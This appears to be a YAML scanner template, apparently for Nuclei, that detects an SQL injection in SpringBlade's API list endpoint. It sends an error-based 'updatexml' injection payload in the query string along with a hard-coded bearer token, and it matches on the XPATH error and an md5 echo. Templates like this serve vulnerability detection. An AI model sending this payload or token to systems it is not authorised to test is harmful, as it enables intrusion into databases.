id: poc-yaml-springblade-api-list-sqli
info:
  name: SpringBlade API List SQL Injection Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  description: |
    A SQL injection vulnerability in SpringBlade's API list endpoint, exploitable through the `updatexml` function.

variables:
  t1: "{{rand_int(1000, 10000)}}"
  t2: "{{md5(t1)}}"

http:
  - raw:
      - |
        GET /api/blade-log/api/list?updatexml(1,concat(0x7e,md5({{t1}}),0x7e),1)=1 HTTP/1.1
        Host: {{Hostname}}
        Blade-Auth: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..RtS67Tmbo7yFKHyMz_bMQW7dfgNjxZW47KtnFcwItxQ

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: word
        words:
          - "XPATH syntax error"
        part: body
      - type: word
        words:
          - "{{substr(t2,0,31)}}"
        part: body
      - type: word
        words:
          - "application/json"
        part: header
